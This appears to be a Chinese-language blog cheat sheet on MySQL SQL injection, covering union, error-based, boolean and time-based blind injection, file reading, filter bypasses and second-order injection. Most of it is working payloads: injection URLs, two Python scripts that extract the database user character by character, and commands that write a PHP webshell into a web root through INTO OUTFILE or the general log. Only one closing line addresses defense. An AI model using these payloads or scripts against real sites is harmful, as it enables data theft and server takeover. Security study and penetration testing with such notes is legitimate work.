
整理sql注入常见的一些方法，算是个提纲框架，以后get到新的姿势，会不断往里面添加。


<!--more-->
## sql注入产生的原因
程序在处理数据库的增删改查前，未校验参数的值，导致数据库执行了预料外的sql语句。

(本文未按get,post什么的分类的原因是因为我至今不明白这样分类有什么意义--,但凡和数据库交互的地方都可能存在SQLI,不要拘泥于数据传递的方式)

# Mysql基础
### 五种子句:
* where
* having  
* group by
* order by
* limit
### 运算符:
```
> < = != <> >= <= 
in(1,2...)
between 1 and 2
not(!)
or(||)
and(&&)
like
% 任意字符
_ 单个字符
```  
### 函数：
* version()  数据库版本
* user()  用户名
* database() 数据库名
* @@datadir 数据库路径
* @@version_compile_os  操作系统版本
* concat()  无分隔符连接
* concat_ws()  第一个参数作分隔符连接
* group_concat()  连接查询到的结果以组返回,在只有一个显示位的时候常用
* ord()  返回第一个字符的ASCII值
* ascii() 同上
* char() ASCII转字符
* if()
* case when true then do1 else do2 end
* benchmark(1000000,md5(1))
* sleep(5)

### 注释
```
#
-- -
/**/
;%00
`
```  


# 联合查询
**要求**: 要求页面返回查询到的数据库内容
## 步骤
* 查列数
> 127.0.0.1/sql1.php?id=1 order by 4
 
* 查哪列的数据被echo出来
> 127.0.0.1/sql1.php?id=-1 UNION SELECT 1,2,3,4 
 
*用-1是为了让union前的查询为空，此时union后的查询结果会占前面的位*

* 查数据库名  
> 127.0.0.1/sql1.php?id=1 UNION SELECT 1,2,3,schema_name from information_schema.schemata    

 *数据库名存放在information_schema数据库下schemata表schema_name字段中*
* 查表名 
> 127.0.0.1/sql1.php?id=1 union select 1,2,3,table_name from information_schema.tables where table_schema='blog' 
 
*表名存放在information_schema数据库下tables表table_name字段中*  

* 查列名
> 127.0.0.1/sql1.php?id=1 union select 1,2,3,4 column_name from information_schema.columns where table_name = 'users' and table_schema = 'blog'   
 
*字段名存放在information_schema数据库下columns表column_name字段中*  

* 查数据 
> 127.0.0.1/sql1.php?id=1 union select 1,2,3,name from users  
 
*实际数据可能多条，常用limit限制*  

# 报错型 
**要求**:要求页面需返回数据库的错误信息
让数据库报错来提取查询内容
前提：输出 mysqli_error()
基础知识:
rand()  产生0~1间的一个随机数，如果给定参数种子，如rand(1)，则生成定值。
floor(x)  返回不大于x的下一个数
count(x)   返回x的数量,如求表的记录数: select count(*) from users;
group by sex 按sex字段分组，单独使用group by 时只返回每组的一条记录
concat()    拼接字符串 
group_concat(pass)  把pass显示在一行
例如:按name分组后，把每组的pass显示在一行
```
mysql> select name,group_concat(pass) from users group by name;
+-------+-----------------------------------------------------------------------+
| name  | group_concat(pass)                                                    |
+-------+-----------------------------------------------------------------------+
| 1     | 1,1,1 or sleep(3),1                                                   |
| aaa   | 0,0,0,0,0,0,0,0,0,0,0,bbb,bbb,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 |
| admin | admin888                                                              |
| test  | test,test                                                             |
+-------+-----------------------------------------------------------------------+
```  
 
## 双查询注入报错
count()等聚合函数后有group by的时候会把查询结果暴到错误信息里显示出来。
```
mysql> select count(*),concat((select database()),'~',floor(rand()*2))as a from information_schema.tables group by a;
ERROR 1062 (23000): Duplicate entry 'blog~1' for key 'group_key'
``` 
 总结的注入语句:
> union select 1 from (select+count(*),concat(floor(rand(0)*2),( 注入爆数据语句))a from information_schema.tables group by a)b   

.暴表名,改limit 1,1就是第二个表
> f4ck.net/index.php?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(table_name as char),0x27,0x7e) FROM information_schema.tables Where table_schema=0xHEX LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1

## ExtractValue(）,updatexml()报错 这种最简单
select extractvalue(1,concat(0x5c,(查询语句)))
```
mysql> select extractvalue(1,concat(0x5c,(select user())));
ERROR 1105 (HY000): XPATH syntax error: '\root@localhost'
``` 

order by 后的报错注入:
```
mysql> select * from users order by id,extractvalue(1, concat(0x5c,(select schema_name from information_schema.schemata limit 1,1)));
ERROR 1105 (HY000): XPATH syntax error: '\blog'
```
## 其他:
[mysql报错方法整理][1]

   [mysql报错原理分析][2]
[MYSQL报错注入的一点总结][3]


# 盲注
**要求**:要求页面返回数据库查询状态
## 基于布尔
> sql语句正确时-->返回正确页面
  sql语句错误时-->返回通用错误页面
### 基础
substr(str,1,1) 从指定位置截取指定长度的字符串
length() 返回字符长度
ascii() 返回ascii码
limit 0,1 返回第一行
limit 2,1 返回第二行

*查数据库第一位是否是b:*
> 127.0.0.1/sql.php?id=1 and substr(database(),1,1)='b'

布尔盲注脚本：
```python
# /usr/bin/env python
# coding:utf-8
'''
bool-based-sql-injection
date: 2017/3/15
'''
import requests

# http://127.0.0.1/sql1.php?id=1 and ascii(substring(user(),1,1))=114
result = ''
for num in range(1, 18):
    for code in range(1, 128):
        url = 'http://127.0.0.1/sql1.php?id=1 and ascii(substring(user(),' + str(num) + ',1))=' + str(code)
        res = requests.get(url)
        if (res.text.find('sucess') != -1):
            result += chr(code)
            print result
```

## 基于时间
**要求**:能执行延时函数
### 基础
sleep(), benchmark() 两个延时函数
if(lala,true,false)
> ?id=1 union select if(substring(user(),1,1)='r',sleep(4),1),null,null
  ?id=1 and  if(substring(user(),1,1)='r',sleep(4),1)  

insert后的延时注入:
```
mysql> insert into users(name) values('123456' and if(true,sleep(5),0));
Query OK, 1 row affected, 3 warnings (5.01 sec)
```

延时注入脚本:
```python
#! /usr/bin/env python
# coding:utf-8
'''
time-based-sql-injection
date: 2017/3/15
'''
import requests, time

result = ''
for num in range(1, 18):
    for code in range(1, 128):
        url = 'http://127.0.0.1/sql1.php?id=1 and if(ascii(substring(user(),' + str(num) + ',1))=' + str(
        code) + ',sleep(3),0)'
        start_time = time.time()
        requests.get(url)
        if time.time() - start_time > 2:
            # print chr(code)
            result += chr(code)
print result
```

# 文件操作：
## 读文件
load_file(file_name)  读取文件并返回文件内容作为一个字符串
条件:
a.要有FILE权限
b.文件要小于max_allowed_packet
(select count(*) from mysql.user)>0 为真说明有权限
注意windows下用\\分割路径

文件导入到数据库:
有数据库权限时可以用来读文件
load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\t'
lines terminated by '\n'
把t0.txt导入到t0表中,fields terminated by 是每一项数据之间的分隔符,lines terminated by 是行的结尾符
错误代码2:文件不存在
错误代码13:没权限

常用的路径:
http://www.cnblogs.com/lcamry/p/5729087.html
 

## 写文件
为了绕过引号，可以把内容hexed
1. select '<?php phpinfo();?>' into outfile "/var/www/html/shell.php"
2. select version() into outfile "/var/www/html/shell.php" LINES TERMINATED BY 16进制代码
第二种是利用的文件结尾符
 
<a href="http://blog.cora-lab.org/287.html">利用日志写shell</a>:
适用于outfile被过滤，或者禁止写入文件，但要root权限
客户端下:
```php
show variables like '%general%';  查看配置

set global general_log = on;  开启general log模式

set global general_log_file = '/var/www/html/1.php';   设置日志目录为shell地址

select '<?php phpinfo();?>';  写入shell
```   


# 宽字节注入
[宽字节注入笔记][4]
宽字节存在常见有两个情况，addslashes()和mysql_real_escape_string()

# 二次排序注入（储存注入）
常见的情况是插入的时候转义了(\')，不能注入，但是可以把注入语句(\')储存到数据库('),这样如果某个地方再调用了这个值且没检查，来拼接到SQL语句里，就可能产生注入。就是多一步储存而已，没啥特殊的。


# 绕过
绕过得看具体情形，太多太多bypass了。

绕过替空型过滤：
preg_replace('/and/',"",$sql)
1.大小写
2.aandnd
3.and(&&), or(||)

绕过空格:
1.注释 /**/
2.%a0
3.不用空格，用括号包括数据 select(1)

还有什么参数污染（HPP）....
# 防御
参数化查询在使用正确的情况下可以完全避免SQL注入。
恰当的配置下，拼接语句前过滤下就不会有什么问题，还是注意编码规范。

*资料:*

[Mysql注入天书][7] 

[不知道叫什么名字但超级有用的注入手册][8] 

[代码审计-SQLI挖掘实例系列（经典）][9]

  [1]: https://www.waitalone.cn/mysql-error-based-injection.html
  [2]: http://www.cnblogs.com/xdans/p/5412468.html
  [3]: https://xianzhi.aliyun.com/forum/read/762.html
  [4]: http://03i0.com/index.php/archives/22/
  [7]: http://www.cnblogs.com/lcamry/p/5763154.html
  [8]: http://www.websec.ca/kb/sql_injection
  [9]: http://www.cnbraid.com/page/7/
